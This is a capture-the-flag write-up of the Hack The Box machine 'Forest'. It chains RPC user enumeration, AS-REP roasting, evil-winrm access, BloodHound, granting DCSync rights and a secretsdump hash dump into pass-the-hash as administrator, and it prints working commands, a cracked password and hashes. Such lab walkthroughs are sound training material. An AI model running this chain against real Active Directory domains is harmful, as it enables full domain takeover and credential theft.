1,Recon
Port scan
	53/tcp dns `Simple DNS Plus`
	88/tcp kerberos-sec
	389/tcp ldap `Microsoft Windows Active Directory LDAP `
	445/tcp SMB
	3269/tcp tcpwrapped
	5985/tcp http `Microsoft HTTPAPI httpd 2.0`
	9389/tcp mc-nmf `.NET Message Framing`
	47001/tcp http

Service check
port 53 dns:
I can resolve htb.local and forest.htb.local from this DNS server:
```
dig  @10.10.10.161 htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.10.10.161 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62514
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: bbee567cd8172763 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      A

;; ANSWER SECTION:
htb.local.              600     IN      A       10.10.10.161

dig  @10.10.10.161 forest.htb.local

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.10.10.161 forest.htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12842
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: ca9fa59dce2451be (echoed)
;; QUESTION SECTION:
;forest.htb.local.              IN      A

;; ANSWER SECTION:
forest.htb.local.       3600    IN      A       10.10.10.161
```

for port 445 SMB:
I would use `smbclient` and `smbmap` to find valid user.
```
smbclient -N -L //10.10.10.161
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbmap -H 10.10.10.161
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.161...
[+] IP: 10.10.10.161:445        Name: 10.10.10.161                                      
        Disk                                                    Permissions
        ----                                                    -----------
```

Very sadly, we did not find anything.

I can try to check over RPC to enumerate users.
`rpcclient -U "" -N 10.10.10.161`
I can get a list of users with enumdomusers:
```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[ahmad] rid:[0x2581]
```

I can list the groups as well:
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

I can also look at a group for it’s members. For example, the Domain Admins group has one member, rid 0x1f4:
```
rpcclient $> querygroup 0x200   
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```
That’s the Administrator account:
```
rpcclient $> queryuser 0x1f4            
        User Name   :   Administrator
        Full Name   :   Administrator
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 20 Sep 2024 13:13:49 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Mon, 30 Aug 2021 20:51:59 EDT
        Password can change Time :      Tue, 31 Aug 2021 20:51:59 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000007d
        padding1[0..7]...
        logon_hrs[0..21]...
```

Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. I have a list of accounts from my RPC enumeration above. I’ll start without the SM* or HealthMailbox* accounts:
```
cat users
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```

Now I can use the Impacket tool GetNPUsers.py to try to get a hash for each user, and I find one for the svc-alfresco account:
```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:40b53cd84c9905289250b50353b5fc44$06a89f54f7989ae3ce4ebea3a3bfb150833e67864d780ec167d710b44e2e938a5b91c17932cf0f06c7dbaf82ee9f17f72bf72c73f5c0d66147e8d8dff9d6eccf2af4a15efefee26d58bd6443d0ed4a3774cd9f56c977a91b517b8cec94a73e2cec3895f091d4cf0b77ec78fbeca0c18cbb4e00ad86b065d4ff04c510346bc42061b0134180a665334fbbb2ee5856f8eef580f7e916d22589602ed94d648be7f4cd62db8fc8ca4754bc85a2ba403386a2e728214ffdb412a6c1c55d05e1933ac848874ecd91b2d7c1f2e26575e920937b63515fcffbee3287472c75e4a80be094

```

Then we can crack it `s3rvice` and we can use `evil-winrm` to connect it.

3,shell as SYSTEM
With my shell, I’ll run SharpHound to collect data for BloodHound. I’ve got a copy of Bloodhound on my machine (you can use git clone https://github.com/BloodHoundAD/BloodHound.git if you don’t). I’ll start a Python webserver in the Ingestors directory, and then load it in to my current session:
`powershell wget http://10.10.16.5/SharpHound.exe -outfile SharpHound.exe`
Then we need to download to our local machine.

Under “Analysis”, I’ll click “Find Shorter Paths to Domain Admin”, and get the following graph:
![](images/Pasted%20image%2020240924094545.png)

There’s two jumps needed to get from my current access as svc-alfresco to Administrator, who is in the Domain Admins group.
Because my user is in Service Account, which is a member of Privileged IT Account, which is a member of Account Operators, it’s basically like my user is a member of Account Operators. And Account Operators has Generic All privilege on the Exchange Windows Permissions group. If I right click on the edge in Bloodhound, and select help, there’s an “Abuse Info” tab in the pop up that displays:
![](images/Pasted%20image%2020240924094741.png)

This gives a full background as to how to abuse this, and if I scroll down, I see an example:
`Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred`
or
`net group "Exchange Windows Permissions" svc-alfresco /add /domain`

In this place, we need to upload the `PowerView.ps1` and import it 
`Import-Module .\PowerView.ps1`

Now I’ll use the fact that members of the Exchange Windows Permissions group have WriteDacl on the domain. Again, looking at the help, it shows commands I can run:
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```

Once I do that, I can run a DCSync attack, either with Mimikatz locally, or with secretsdump.py from my Kali box, since DCSync only requires access to TCP 445, TCP 135, and a TCP RPC port (49XXX).

I’ll create a one-liner to run locally. I don’t need to pass credentials to the first command, because I’m already running as a user with those rights. I did have to pass credentials to the second command. My best guess is that the session doesn’t know yet about my being in the new group from the first command, and that passing credentials refreshes that.
```
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

Then we can check the special group member
```
net group 'Exchange Windows Permissions'

Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members
-------------------------------------------------------------------------------
svc-alfresco             
The command completed successfully.
```


If I run that on Forest, it returns without error:
```
*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

I can also run secretsdump.py and get hashes:
```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

```

Then we can use `evil-winrm` to shell as SYSTEM.
```
evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

Beyond the root:
There is a cleanup powershell script 
```
C:\Users\Administrator\Documents> type revert.ps1

Import-Module C:\Users\Administrator\Documents\PowerView.ps1

$users = Get-Content C:\Users\Administrator\Documents\users.txt

while($true)

{
    Start-Sleep 60

    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    Foreach ($user in $users) {
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        if ($groups -ne $null){
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}
```

It loops doing the following:

1. Sleep for 60 seconds.
2. Resets the password for svc-alfresco to “s3rvice”.
3. Loops over each user in users.txt in the Administrators documents folder.
4. For each user, it removes the DCSync rights, and removes the user from all groups that are not named “Service Accounts”

Querying the details confirms it:
```
C:\>schtasks /query /tn restore /v /fo list

Folder: \
HostName:                             FOREST
TaskName:                             \restore
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        10/19/2019 9:22:00 AM
Last Result:                          267009
Author:                               HTB\Administrator
Task To Run:                          powershell.exe -ep bypass C:\Users\Administrator\Documents\revert.ps1
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```
